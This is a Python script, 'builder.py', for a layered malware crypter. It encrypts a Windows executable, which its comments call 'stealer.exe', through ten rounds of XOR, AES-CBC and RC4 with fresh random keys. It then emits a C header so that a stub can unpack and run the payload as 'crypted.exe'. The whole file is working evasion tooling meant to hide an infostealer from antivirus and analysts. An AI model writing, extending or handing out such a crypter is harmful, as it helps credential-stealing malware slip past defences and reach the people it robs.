#!/usr/bin/env python3
# builder.py — layered crypter (XOR / AES-CBC / RC4), depth set by LAYERS
# platform: attacker machine (any OS with Python 3.8+)
# deps: pip install pycryptodome
# usage: python builder.py <stealer.exe> [output_header=payload_data.h]
#
# output: payload_data.h  → #include in stub/stub.cpp before compile
# pipeline: python builder.py stealer.exe  →  g++ stub.cpp  →  crypted.exe

import sys, os, secrets, struct
from Crypto.Cipher import AES

# ── layer plan ────────────────────────────────────────────────────────────────
# Applied top → bottom: the first entry is the innermost wrap around the PE and
# the last entry is the outermost shell an unpacker meets first. The primitives
# cycle so no two neighbouring rounds are the same transform, and every round
# draws a fresh random key, so no two builds are alike.
#
# stub.cpp never hardcodes the depth — it reads LAYER_COUNT out of the generated
# header — so changing this list is the only edit needed to re-roll the wrapping.
LAYERS = [
    ("xor", 256),   # L1   innermost
    ("aes", 32),    # L2
    ("rc4", 64),    # L3
    ("xor", 128),   # L4
    ("aes", 32),    # L5
    ("xor", 32),    # L6
    ("rc4", 96),    # L7
    ("xor", 160),   # L8
    ("aes", 32),    # L9
    ("xor", 80),    # L10  outermost
]
KIND_CODE = {"xor": 0, "aes": 1, "rc4": 2}


# ── helpers ──────────────────────────────────────────────────────────────────

def xor_rolling(data: bytes, key: bytes) -> bytes:
    klen = len(key)
    return bytes(b ^ key[i % klen] for i, b in enumerate(data))

def rc4(data: bytes, key: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    out = bytearray(len(data))
    for n, b in enumerate(data):
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out[n] = b ^ S[(S[i] + S[j]) % 256]
    return bytes(out)

def aes_cbc_enc(data: bytes, key: bytes, iv: bytes) -> bytes:
    pad = 16 - (len(data) % 16)
    data += bytes([pad] * pad)
    return AES.new(key, AES.MODE_CBC, iv).encrypt(data)

def to_c_array(name: str, data: bytes) -> str:
    hex_vals = ', '.join(f'0x{b:02X}' for b in data)
    return (f"static const uint8_t {name}[] = {{{hex_vals}}};\n"
            f"static const size_t  {name}_SIZE = {len(data)};\n\n")

def to_c_iv(name: str, data: bytes) -> str:
    hex_vals = ', '.join(f'0x{b:02X}' for b in data)
    return f"static const uint8_t {name}[16] = {{{hex_vals}}};\n\n"

# ── main ─────────────────────────────────────────────────────────────────────

def main():
    if len(sys.argv) < 2:
        print("usage: python builder.py <input.exe> [output.h]")
        sys.exit(1)

    inp   = sys.argv[1]
    out_h = sys.argv[2] if len(sys.argv) > 2 else "payload_data.h"

    with open(inp, 'rb') as f:
        data = f.read()

    original_size = len(data)
    print(f"[*] input  : {inp}  ({original_size:,} bytes)")
    print(f"[*] depth  : {len(LAYERS)} layers")

    # every round gets its own random key; AES rounds additionally get an IV
    plan = []
    for kind, klen in LAYERS:
        key = secrets.token_bytes(klen)
        iv  = secrets.token_bytes(16) if kind == "aes" else None
        plan.append((kind, key, iv))

    # encrypt layer 1 → N  (N ends up outermost)
    d = data
    for idx, (kind, key, iv) in enumerate(plan, 1):
        if kind == "xor":
            d = xor_rolling(d, key)
            label = f"XOR-{len(key)}B"
        elif kind == "rc4":
            d = rc4(d, key)
            label = f"RC4-{len(key)}B"
        else:
            d = aes_cbc_enc(d, key, iv)
            label = "AES-CBC"
        print(f"[+] L{idx:<2} {label:<10}: {len(d):>10,} B")

    print(f"[*] encrypted size : {len(d):,} bytes  (overhead: {len(d)-original_size:+,})")

    n = len(plan)

    # write header — ASCII only: 0x97-style raw bytes from default cp1252
    # encoding would make the header unreadable to utf-8 tooling
    with open(out_h, 'w', encoding='ascii') as f:
        f.write("#pragma once\n#include <cstdint>\n\n")
        f.write(f"static const size_t ORIGINAL_PE_SIZE = {original_size};\n\n")

        for i, (kind, key, iv) in enumerate(plan, 1):
            f.write(to_c_array(f"K{i}", key))
            if iv is not None:
                f.write(to_c_iv(f"IV{i}", iv))

        # embedded, not fetched -- see the note at the top of stub.cpp
        f.write(to_c_array("ENC_PAYLOAD", d))

        # the stub walks this table from LAYER_COUNT-1 down to 0, which is the
        # exact reverse of the order above — that is what unwraps it.
        kinds = ', '.join(str(KIND_CODE[k]) for k, _, _ in plan)
        keys  = ', '.join(f"K{i}" for i in range(1, n + 1))
        klens = ', '.join(f"K{i}_SIZE" for i in range(1, n + 1))
        ivs   = ', '.join(f"IV{i}" if iv is not None else "nullptr"
                          for i, (_, _, iv) in enumerate(plan, 1))

        f.write("enum { LYR_XOR = 0, LYR_AES = 1, LYR_RC4 = 2 };\n")
        f.write(f"static const size_t  LAYER_COUNT = {n};\n")
        f.write(f"static const uint8_t  LAYER_KIND[{n}] = {{ {kinds} }};\n")
        f.write(f"static const uint8_t* LAYER_KEY [{n}] = {{ {keys} }};\n")
        f.write(f"static const size_t   LAYER_KLEN[{n}] = {{ {klens} }};\n")
        f.write(f"static const uint8_t* LAYER_IV  [{n}] = {{ {ivs} }};\n")

    print(f"[+] header written : {out_h}  ({n} layers)")

if __name__ == '__main__':
    main()
